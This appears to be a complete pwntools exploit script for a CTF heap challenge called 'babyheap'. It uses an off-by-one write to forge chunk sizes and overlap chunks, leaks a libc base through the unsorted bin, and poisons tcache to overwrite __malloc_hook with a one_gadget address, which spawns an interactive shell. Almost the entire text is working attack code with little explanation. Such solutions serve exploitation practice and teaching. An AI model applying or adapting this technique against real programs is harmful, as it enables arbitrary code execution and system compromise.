#coding=utf-8
from pwn import *
a=process("./babyheap")
context.terminal=["tmux","splitw","-h"]
def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x0000000000013C6)
    b *(0x555555554000+0x000000000001419)
    ''')
#add,free
elf=ELF("./babyheap")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def menu(choice):
    a.recvuntil("> ")
    a.sendline(choice)
def add(size,content):
    menu("M")
    a.recvuntil("> ")
    a.sendline(str(size))
    a.recvuntil("> ")
    a.send(content)
def show(index):
    menu("S")
    a.recvuntil("> ")
    a.sendline(str(index))
def delete(index):
    menu("F")
    a.recvuntil("(Starting from 0) Index:\n> ")
    a.sendline(str(index))

add(0xf8,'\n')#0                     0
add(0xf8,'\n')#1                     0x100
add(0xf8,'A'*120+'\x81\x00')#2       0x200  , 0x81 is fake_size, to bypass free's check

delete(0)
add(0xf8,'\x81'*0xf9+'\n')#0 offbyone , chunk1 size 0x100 ==> 0x180
for i in range(7):
    add(0x100,'\n')
for i in range(3,10):
    delete(i)


delete(0) 
delete(1) 
for i in range(7):
    add(0x100,'\n') # 0 1 3 4 5 6 7 ，clear tcache to split unsorted chunk in unsorted bin


add(0x178,'A'*8+'\n')#8  , chunk_overlap
show(8)
a.recvuntil("A"*8)
libc_base = u64(a.recvuntil("\n",drop=True).ljust(8,'\x00'))-96-libc.symbols["__malloc_hook"]-0x10
success("libc_base ==> 0x%x"%libc_base)

delete(2)
delete(8)

free_hook=libc_base+libc.symbols["__free_hook"]
malloc_hook=libc_base+libc.symbols["__malloc_hook"]
system_addr=libc_base+libc.symbols["system"]
one_gadget=libc_base+0x10a38c

payload='A'*0x100+p64(malloc_hook)[:6]+'\n'
add(0x178,payload)#2

add(0xf8,'/bin/sh\x00')#8
add(0xf8,p64(one_gadget)[:6]+'\n')

delete(2)
menu("M")
a.recvuntil("> ")
a.sendline(str(30))

a.interactive()